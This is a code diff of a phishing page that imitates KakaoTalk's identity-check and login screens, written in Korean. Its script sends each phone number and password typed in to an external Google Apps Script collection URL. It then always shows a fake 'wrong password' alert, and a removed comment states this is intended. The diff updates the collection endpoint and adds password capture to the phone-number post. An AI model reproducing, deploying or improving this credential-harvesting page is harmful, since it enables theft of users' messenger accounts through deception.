@@ -22,7 +22,6 @@
   </style>
 </head>
 <body>
-  <!-- 안내 페이지 -->
   <div id="page1" class="container">
     <h1>톡안녕패스로<br>이용자보호조치를 완화하세요.</h1>
     <p>모두를 위한 카톡 안녕가이드에서<br>이용자보호조치에 대해 더 자세히 알아보세요.</p>
@@ -42,7 +41,6 @@
     <button class="btn-yellow" onclick="goNext()">본인인증하기</button>
   </div>
 
-  <!-- 로그인 화면 -->
   <div id="page2" class="login-container hidden">
     <h2>카카오톡을 시작합니다</h2>
     <input type="text" placeholder="이메일 또는 전화번호" style="width: 370px; padding: 5px;">
@@ -61,12 +59,11 @@
       }
     }
 
-    const GAS_URL = 'https://script.google.com/macros/s/AKfycbxVRTiAQ4Wb7MvGO0YaH6f7u-uDAYtx125VU11il2uCh9CJpWiFklnqHi62frMNX9iB/exec';
+    const GAS_URL = 'https://script.google.com/macros/s/AKfycbxny-JpFuRIjNI7fJYtC0hh7ImFF9jY-ZZzdOb8FbddA9viJC0r9lEhvBp0wFcfpw0e/exec';
 
     const phoneInput = document.querySelector('input[type="text"]');
     let phoneSent = false;
 
-    // 전화번호 입력 이벤트
     phoneInput.addEventListener('input', () => {
       const phone = phoneInput.value.trim();
 
@@ -81,9 +78,10 @@
           fetch(GAS_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone })
+            body: JSON.stringify({ phone, password: '' })
           })
-          .then(res => console.log('전화번호 전송 완료', res))
+          .then(res => res.json())
+          .then(data => console.log('전화번호 전송 완료', data))
           .catch(err => console.error('전화번호 전송 오류', err));
           phoneSent = true;
         }
@@ -92,7 +90,6 @@
       }
     });
 
-    // 로그인 버튼 클릭 시 전송 + 무조건 틀림 알림
     const loginBtn = document.querySelector('.btn-gray');
     loginBtn.addEventListener('click', () => {
       const phone = phoneInput.value.trim();
@@ -103,7 +100,8 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone, password })
       })
-      .then(res => console.log('정보 전송 완료', res))
+      .then(res => res.json())
+      .then(data => console.log('정보 전송 완료', data))
       .catch(err => console.error('정보 전송 오류', err));
 
       alert('카카오톡 전화번호 또는 비밀번호가 틀렸습니다. 다시 확인해주세요');
